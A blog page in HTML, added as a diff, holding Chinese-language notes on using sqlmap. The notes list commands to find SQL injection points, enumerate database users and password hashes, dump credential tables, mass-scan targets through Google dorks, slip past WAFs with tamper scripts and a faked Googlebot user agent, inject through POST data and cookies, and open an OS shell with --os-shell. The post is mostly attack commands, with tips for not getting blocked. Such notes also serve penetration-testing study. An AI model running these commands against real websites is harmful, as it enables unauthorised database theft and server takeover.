@@ -1,0 +1,270 @@
+
+<!DOCTYPE html>
+<html>
+  <head>
+    
+<meta charset="utf-8" >
+
+<title>SQLmap使用笔记 | 零度时光</title>
+<meta name="description" content="温故而知新">
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.7.0/animate.min.css">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://domognete76.github.io/favicon.ico?v=1596619793061">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+<link rel="stylesheet" href="https://domognete76.github.io/styles/main.css">
+
+
+
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+<script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+
+
+
+  </head>
+  <body>
+    <div id="app" class="main">
+      <div class="site-header-container">
+  <div class="site-header">
+    <div class="left">
+      <a href="https://domognete76.github.io">
+        <img class="avatar" src="https://domognete76.github.io/images/avatar.png?v=1596619793061" alt="" width="32px" height="32px">
+      </a>
+      <a href="https://domognete76.github.io">
+        <h1 class="site-title">零度时光</h1>
+      </a>
+    </div>
+    <div class="right">
+      <transition name="fade">
+        <i class="icon" :class="{ 'icon-close-outline': menuVisible, 'icon-menu-outline': !menuVisible }" @click="menuVisible = !menuVisible"></i>
+      </transition>
+    </div>
+  </div>
+</div>
+
+<transition name="fade">
+  <div class="menu-container" style="display: none;" v-show="menuVisible">
+    <div class="menu-list">
+      
+        
+          <a href="/" class="menu purple-link">
+            首页
+          </a>
+        
+      
+        
+          <a href="/archives" class="menu purple-link">
+            归档
+          </a>
+        
+      
+        
+          <a href="/tags" class="menu purple-link">
+            标签
+          </a>
+        
+      
+        
+          <a href="/post/about" class="menu purple-link">
+            关于
+          </a>
+        
+      
+    </div>
+  </div>
+</transition>
+
+
+      <div class="content-container">
+        <div class="post-detail">
+          
+          <h2 class="post-title">SQLmap使用笔记</h2>
+          <div class="post-info post-detail-info">
+            <span><i class="icon-calendar-outline"></i> 2020-08-05</span>
+            
+          </div>
+          <div class="post-content">
+            <h2 id="sqlmap的常用语法">SQLMap的常用语法</h2>
+<pre><code>1../sqlmap.py -u &quot;www.xxx.com/news.asp?id=1&quot;//检查注入点
+
+2.sqlmap -u &quot;www.xxx.com/news.asp?id=1&quot; --current-user//获取当前用户名
+
+3.sqlmap -u &quot;www.xxx.com/news.asp?id=1&quot; --current-db//获取数据库名，得到库admin
+
+4.sqlmap -u &quot;www.xxx.com/news.asp?id=1&quot; --privileges//权限判断
+
+5.sqlmap -u &quot;www.xxx.com/news.asp?id=1&quot; --users//枚举管理系统用户
+
+6.sqlmap -u &quot;www.xxx.com/news.asp?id=1&quot; --passwords//枚举管理系统用户哈希
+
+7.sqlmap -u &quot;www.xxx.com/news.asp?id=1&quot; --tables -D &quot;admin&quot;//查admin库中的表名，得到user表
+
+8.sqlmap -u &quot;www.xxx.com/news.asp?id=1&quot; --columns -T &quot;user&quot; -D &quot;admin&quot; -v 5//查字段，v后数字越大越详细，得到id,username,password
+
+9.sqlmap -u &quot;www.xxx.com/news.asp?id=1&quot; --dump -C &quot;id,username,password&quot; -T &quot;user&quot; -D &quot;admin&quot; -v 5//拖库，或者使用--dump-all
+
+10.--dbms &quot;Mysql&quot;//指定数据库类型
+
+11.--dbs//列数据库
+
+12.--passwords -U root//指定列数据库用户root的密码
+
+13.--level 5//执行测试的等级
+
+14.--user-agent &quot;Googlebot/2.1&quot;
+
+15.--tamper &quot;space2morehash.py&quot;
+
+以上为常用sqlmap命令，其他的请查阅手册。
+</code></pre>
+<hr>
+<h2 id="sqlmap-借助google批量扫注入点">SQLmap 借助google批量扫注入点</h2>
+<pre><code>1.sqlmap -g &quot;site:target.com inurl:asp&quot;
+
+2.如果要查询注入选y，跳过选n
+
+
+
+注：大部分查询结果不存在注入
+</code></pre>
+<hr>
+<h2 id="sqlmap-利用编码绕过waf">SQLmap 利用编码绕过WAF</h2>
+<pre><code>通过不同编码，绕过WAF
+
+1.sqlmap -u &quot;www.xxx.com/news.asp?id=1&quot; --dbs --tamper &quot;space2morehash.py&quot;//利用.py脚本改变编码，除了space2hash.py，还有base64encode.py、charencode.py等等，可查/usr/share/sqlmap/tamper
+
+2.sqlmap.py --proxy http://127.0.0.1:8087 -u &quot;www.xxx.com/news.asp?id=1&quot; -v 3 –dbms “MySQL” --tamper &quot;space2morehash.py&quot; --referer &quot;http://www.google.com&quot; --user-agent &quot;Googlebot/2.1&quot;  //模拟google爬虫
+</code></pre>
+<hr>
+<h2 id="sqlmap-post注入">SQLmap post注入</h2>
+<pre><code>方法一：结合burpsuite来使用sqlmap，用这种方法进行post注入测试会更准确，操作起来也非常容易。
+
+1.浏览器打开目标地址 http://www.testfire.net/bank/login.aspx
+
+2.配置burp代理(127.0.0.1:8080)以拦截请求
+
+3.点击login表单的submit按钮
+
+4.如下图，这时候Burp会拦截到了我们的登录POST请求
+
+5.把这个post请求复制为txt, 我这命名为testfire.txt 然后把它放至root目录下
+
+6.运行sqlmap并使用如下命令：sqlmap -r /root/testfire.txt -p uid，这里参数 -r 是让sqlmap加载我们的post请求testfire.txt，而 -p 为指定注入用的参数。
+
+
+
+方法二：指定参数post注入
+
+1.sqlmap -u &quot;http://www.testfire.net/bank/login.aspx&quot; --data &quot;uid=Admin&amp;passw=a&amp;btnSubmit=Login&quot;
+</code></pre>
+<hr>
+<h2 id="sqlmap-cookies注入">SQLmap cookies注入</h2>
+<pre><code>1.sqlmap -u &quot;www.xxx.com/news.asp&quot; --cookie &quot;id=1&quot; --current-db
+
+2.sqlmap -u &quot;www.xxx.com/news.asp&quot; --cookie &quot;id=1&quot; --tables -D &quot;admin&quot;
+
+......
+
+
+
+注：注入时有可能存在连接线程数限制，线程设置不要太大
+</code></pre>
+<hr>
+<h2 id="sqlmap-执行shell命令">SQLmap 执行shell命令</h2>
+<pre><code>在数据库权限足够大的时候，可以使用cmd命令:
+
+1.sqlmap -u &quot;www.xxx.com/news.asp?id=1&quot; --os-cmd=ipconfig//执行ipconfig命令
+
+2.选取该web的脚本种类，此时为asp，选1
+
+3.指定网站的根目录路径，如：d:\www\
+
+
+
+获得一个shell
+
+1.sqlmap -u &quot;www.xxx.com/news.asp?id=1&quot; --os-shell
+
+2.选取该web的脚本种类，此时为asp，选1
+
+3.指定网站的根目录路径，如：d:\www\
+
+4.此时可以执行命令，并会在d:\www\下生成两个临时文件（tmpbxbxz.php/tmpuoiuz.php）
+</code></pre>
+<hr>
+<h2 id="sqlmap-伪静态注入">SQLmap 伪静态注入</h2>
+<pre><code>伪静态页面网址：www.xxx.com/index.php/Index/view/id/40.html
+
+1.sqlmap -u &quot;www.xxx.com/index.php/Index/view/id/40*.html&quot; --dbs//在存在注入的地方加入*键
+
+2.sqlmap -u &quot;www.xxx.com/index.php/Index/view/id/40*.html&quot; --tables -D &quot;admin&quot;
+
+......
+</code></pre>
+<hr>
+<h2 id="sqlmap-延迟注入">SQLmap 延迟注入</h2>
+<pre><code>某些网站有防注入保护，短时间内如果请求次数较多或短时间内请求错误页面次数较多都可能被网站屏蔽
+
+1.sqlmap -u &quot;www.xxx.com/index.php/Index/view/id/40*.html&quot; --dbs --delay 5//间隔5秒请求一次
+
+2.--safe-url//详细说明请查阅手册
+
+3.--safe-freq//详细说明请查阅手册</code></pre>
+
+          </div>
+        </div>
+
+        
+          <div class="next-post">
+            <a class="purple-link" href="https://domognete76.github.io/post/hello-gridea/">
+              <h3 class="post-title">
+                下一篇：Hello Gridea
+              </h3>
+            </a>
+          </div>
+          
+      </div>
+
+      
+
+      <div class="site-footer">
+  <div class="slogan">温故而知新</div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+  ICP备案网站信息<a href="http://beian.miit.gov.cn/" target="_blank">鄂ICP备17008616号 </a>|
+本网站由<a href="https://www.upyun.com/?utm_source=lianmeng&utm_medium=referral" target="_blank"><img src="https://i.loli.net/2020/08/05/HdGZmTIEUgwft94.png" height="50" width="100" /></a>提供 CDN 加速/云存储服务 | <a class="rss" href="https://domognete76.github.io/atom.xml" target="_blank">RSS</a>
+</div>
+
+
+    </div>
+    <script type="application/javascript">
+
+hljs.initHighlightingOnLoad()
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+
+
+  </body>
+</html>
